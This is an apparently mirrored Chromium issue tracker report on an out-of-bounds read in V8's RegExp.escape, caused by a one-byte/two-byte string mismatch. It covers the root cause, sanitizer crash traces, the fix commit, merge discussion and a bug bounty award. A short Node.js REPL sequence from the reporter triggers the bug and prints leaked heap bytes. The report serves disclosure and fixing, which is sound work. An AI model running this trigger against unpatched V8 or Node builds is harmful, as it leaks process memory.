# RegExp.escape byteness mismatch OOB read 

| Field | Value |
|-------|-------|
| **Issue ID** | [478659010](https://issues.chromium.org/issues/478659010) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Blink>JavaScript, Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | qy...@gmail.com |
| **Assignee** | pt...@chromium.org |
| **Created** | 2026-01-26 |
| **Bounty** | $7,000.00 |

## Description

#VULNERABILITY DETAILS
RegExp.escape determines whether to copy the input as one-byte or two-byte based on the string's map (String::IsOneByteRepresentation). A crafted SlicedString can keep a two-byte map while its underlying storage becomes one-byte after internalization/thinning, causing RegExp.escape to read the string as UC16 from one-byte backing storage. This results in an out-of-bounds read.

#VERSION
d8 Version: [14.6.0] + [candidate]
Operating System: [Ubuntu 24.04 x64]

#Root cause
RegExp.escape flattens the input, then branches on IsOneByteRepresentation():

```
- builtins-regexp.cc:352-388
  - String::Flatten(isolate, str)
  - if (str->IsOneByteRepresentation())
      copy = OwnedCopyOf(str->GetFlatContent().ToOneByteVector())
    else
      copy = OwnedCopyOf(str->GetFlatContent().ToUC16Vector())

```

IsOneByteRepresentation() is map-based (string shape), not content-based:

```
- string-inl.h:521-523
  String::IsOneByteRepresentation() -> InstanceTypeChecker::IsOneByteString(map)

```

When a non-internalized string is internalized, it can become a ThinString that
points to a canonical internalized string whose map encoding is one-byte:

```
- string.cc:155-200
  String::MakeThin uses internalized->IsOneByteRepresentation() to select the
  thin map and rewrites the original to ThinString(actual = internalized)

```

For sliced strings, the slice keeps its own map (two-byte) even if the parent string becomes thin to a one-byte internalized canonical. This creates a byteness mismatch: map says two-byte, backing storage is one-byte.

#Crash State

```
=================================================================
==125374==ERROR: AddressSanitizer: use-after-poison on address 0x6e12c0005028 at pc 0x57ee1e60cffb bp 0x7ffcef6cb890 sp 0x7ffcef6cb050
READ of size 40 at 0x6e12c0005028 thread T0
    #0 0x57ee1e60cffa in __asan_memcpy (/home/qy/new2/v8/out/x64.asan/d8+0x13b8ffa) (BuildId: e276665bb2c58cdf)
    #1 0x57ee1eb00b1f in MemCopy src/base/memcopy.h
    #2 0x57ee1eb00b1f in Copy<const unsigned short *, unsigned short *> src/base/algorithm.h:38:3
    #3 0x57ee1eb00b1f in NewByCopying<unsigned short> src/base/vector.h:304:5
    #4 0x57ee1eb00b1f in OwnedCopyOf<unsigned short> src/base/vector.h:386:10
    #5 0x57ee1eb00b1f in OwnedCopyOf<v8::base::Vector<const unsigned short> > src/base/vector.h:395:10
    #6 0x57ee1eb00b1f in v8::internal::Builtin_Impl_RegExpEscape(v8::internal::BuiltinArguments, v8::internal::Isolate*) src/builtins/builtins-regexp.cc:385:14
    #7 0x57ee23415235 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #8 0x57ee23364829 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #9 0x57ee233615db in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #10 0x57ee2336132a in Builtins_JSEntry setup-isolate-deserialize.cc
    #11 0x57ee1ed1a126 in Call src/execution/simulator.h:216:12
    #12 0x57ee1ed1a126 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #13 0x57ee1ed1b5a8 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #14 0x57ee1e936b4b in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:2015:7
    #15 0x57ee1e6780e7 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1037:44
    #16 0x57ee1e6b0549 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5591:10
    #17 0x57ee1e6bc84d in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6599:37
    #18 0x57ee1e6bbc85 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6507:18
    #19 0x57ee1e6bf327 in v8::Shell::Main(int, char**) src/d8/d8.cc:7404:18
    #20 0x736220e2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #21 0x736220e2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #22 0x57ee1e56d029 in _start (/home/qy/new2/v8/out/x64.asan/d8+0x1319029) (BuildId: e276665bb2c58cdf)

Address 0x6e12c0005028 is a wild pointer inside of access range of size 0x000000000028.
SUMMARY: AddressSanitizer: use-after-poison (/home/qy/new2/v8/out/x64.asan/d8+0x13b8ffa) (BuildId: e276665bb2c58cdf) in __asan_memcpy
Shadow bytes around the buggy address:
  0x6e12c0004d80: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x6e12c0004e00: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x6e12c0004e80: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x6e12c0004f00: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x6e12c0004f80: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
=>0x6e12c0005000: 00 00 00 00 00[f7]f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x6e12c0005080: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x6e12c0005100: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x6e12c0005180: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x6e12c0005200: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x6e12c0005280: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

NOTE: the stack trace above identifies the code that *accessed* the poisoned memory.
To identify the code that *poisoned* the memory, try the experimental setting ASAN_OPTIONS=poison_history_size=<size>.
==125374==ABORTING
Received signal 6

==== C stack trace ===============================

out/x64.asan/d8(__interceptor_backtrace+0x46)[0x57ee1e5b4b36]
out/x64.asan/d8(+0x63976c0)[0x57ee235eb6c0]
/lib/x86_64-linux-gnu/libc.so.6(+0x45330)[0x736220e45330]
/lib/x86_64-linux-gnu/libc.so.6(pthread_kill+0x11c)[0x736220e9eb2c]
/lib/x86_64-linux-gnu/libc.so.6(gsignal+0x1e)[0x736220e4527e]
/lib/x86_64-linux-gnu/libc.so.6(abort+0xdf)[0x736220e288ff]
out/x64.asan/d8(+0x13dbc5c)[0x57ee1e62fc5c]
out/x64.asan/d8(+0x13da44e)[0x57ee1e62e44e]
out/x64.asan/d8(+0x13c188b)[0x57ee1e61588b]
out/x64.asan/d8(+0x13c366d)[0x57ee1e61766d]
out/x64.asan/d8(__asan_memcpy+0x3ab)[0x57ee1e60d02b]
out/x64.asan/d8(+0x18acb20)[0x57ee1eb00b20]
out/x64.asan/d8(+0x61c1236)[0x57ee23415236]
[end of stack trace]
Aborted

```

## Attachments

- [poc.js](attachments/poc.js) (text/javascript, 514 B)

## Timeline

### ch...@google.com (2026-01-26)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### qy...@gmail.com (2026-01-26)

Sorry, I forgot to provide the command.

d8 --expose\_externalize\_string poc.js

### cl...@appspot.gserviceaccount.com (2026-01-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6093669299847168.

### 24...@project.gserviceaccount.com (2026-01-26)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2026-01-26)

Detailed Report: https://clusterfuzz.com/testcase?key=6093669299847168

Fuzzer: None
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: Heap-buffer-overflow READ {*}
Crash Address: 0x7a28235ead38
Crash State:
  unsigned short* v8::base::Copy<unsigned short const*, unsigned short*>
  v8::base::OwnedVector<unsigned short> v8::base::OwnedVector<unsigned short>::New
  v8::internal::Builtin_Impl_RegExpEscape
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8&range=102363:102364

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6093669299847168

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### ke...@chromium.org (2026-01-26)

Thank you for the report.

Assigning to the v8 shepherd.

### is...@chromium.org (2026-01-27)

Assigning to RegExp folks.

### ch...@google.com (2026-01-27)

Setting milestone because of s2 severity.

### ch...@google.com (2026-01-27)

Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### qy...@gmail.com (2026-01-28)

Additional information:

This issue is also reproducible on the official Node.js release build.

Environment:

- Node.js v24.13.0 (official Windows release)
- Reproduced via node.exe with --expose_externalize_string

The output is as follows:

C:\Program Files\nodejs>"C:\Program Files\nodejs\node.exe" --expose_externalize_string
Welcome to Node.js v24.13.0.
Type ".help" for more information.
> const base = "a".repeat(20) + "b".repeat(20);
> const o1 = {};
> o1[base] = 1;
> const ext = createExternalizableTwoByteString(base);
> const slice = /b+/.exec(ext)[0];
> const o2 = {};
> o2[ext] = 1;
> const internal = Object.getOwnPropertyNames(o2)[0];
> externalizeString(internal);
> RegExp.escape(slice);
'扢扢扢扢扢扢扢扢扢扢\\udd8b睬蠀न冷ʷ\x00谀'

### dx...@google.com (2026-01-28)

Project: v8/v8  

Branch:  main  

Author:  pthier [pthier@chromium.org](mailto:pthier@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7520539>

Fix RegExp.escape byte check

---


Expand for full commit details
```
     
    RegExp.escape wrongly used IsOneByteRepresentation() instead of 
    IsOneByteRepresentationUnderneath(). 
     
    Fixed: 478659010 
    Bug: 353856236 
    Change-Id: Icbee422d6e76f423c447877956554156287b72d8 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7520539 
    Commit-Queue: Jakob Linke <jgruber@chromium.org> 
    Auto-Submit: Patrick Thier <pthier@chromium.org> 
    Reviewed-by: Jakob Linke <jgruber@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#104948}

```

---

Files:

- M `src/builtins/builtins-regexp.cc`

---

Hash: [134c3696cd53593d7a668bf3cc88a06a1750c67d](https://chromiumdash.appspot.com/commit/134c3696cd53593d7a668bf3cc88a06a1750c67d)  

Date: Tue Jan 27 15:58:47 2026


---

### 24...@project.gserviceaccount.com (2026-01-28)

ClusterFuzz testcase 6093669299847168 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8&range=104947:104948

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### dx...@google.com (2026-01-28)

[Details redacted due to bug visibility]

Change-Id: I27c0ba294aacc90f6ba3bdc73ea795a6fadf2d85  

<https://chrome-internal-review.git.corp.google.com/8968836>

### ch...@google.com (2026-01-28)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M145. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### pt...@chromium.org (2026-01-28)

> Which CLs should be backmerged? (Please include Gerrit links.)

<https://crrev.com/c/7520539>

> Has this fix been verified on Canary to not pose any stability regressions?

No, not yet.

> Does this fix pose any potential non-verifiable stability risks?

No

> Does this fix pose any known compatibility risks?

No

> Does it require manual verification by the test team? If so, please describe required testing.

No

### qy...@gmail.com (2026-01-28)

Thanks for the fix.

For credit, please use:
Reporter credit: qymag1c

Also, could you let me know whether this issue will receive a CVE ID?
Thanks!


### ch...@google.com (2026-01-29)

Merge review required: M145 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### dr...@chromium.org (2026-02-02)

Given the severity of S2, I don't think this needs a merge to Stable. We'll follow up to make sure the automation isn't requesting unnecessary merges.

### sp...@google.com (2026-02-20)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $7000.00 for this report.

Rationale for this decision:
Baseline memory corruption in a sandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-05-07)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> Baseline memory corruption in a sandboxed process

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/478659010)*
